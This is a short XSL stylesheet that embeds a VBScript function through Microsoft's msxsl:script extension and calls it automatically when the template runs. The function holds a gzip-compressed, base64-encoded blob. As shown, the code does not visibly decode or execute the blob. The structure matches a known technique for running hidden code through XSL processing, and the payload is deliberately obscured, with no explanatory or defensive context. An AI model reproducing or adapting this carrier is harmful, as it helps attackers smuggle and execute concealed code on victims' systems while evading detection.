<?xml version="1.0"?>
<xsl:stylesheet xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" xmlns:user="urn:user-fn"><msxsl:script language="VBScript" implements-prefix="user">Function run()
  Dim descriptor_7c41e09a
  descriptor_7c41e09a = "H4sIAAAAAAACAz2OTQrCMBCFL6S2VkEU5gbudOEuDMm0DaZJyEyKizm8UcHd" &amp; _
      "e3y8nxUOGjBOFSeCFwfRkgJBSOio6ErFeSuwYPDWp8qKImifcN8PQ6/oMAsV" &amp; _
      "WLglDdvis+icWEwuafTh12i+WFnahLGpRoGhOcoMI4mdzZdsSo0/pRaXjH6Kxjt43K737cke99SfUWsJMItkvnTdp/pPdvRqoUA7H9f21XU8vAGjaqs92gAAAA=="
  run = "ok"
End Function
</msxsl:script><xsl:template match="/"><xsl:value-of select="user:run()" /></xsl:template></xsl:stylesheet>
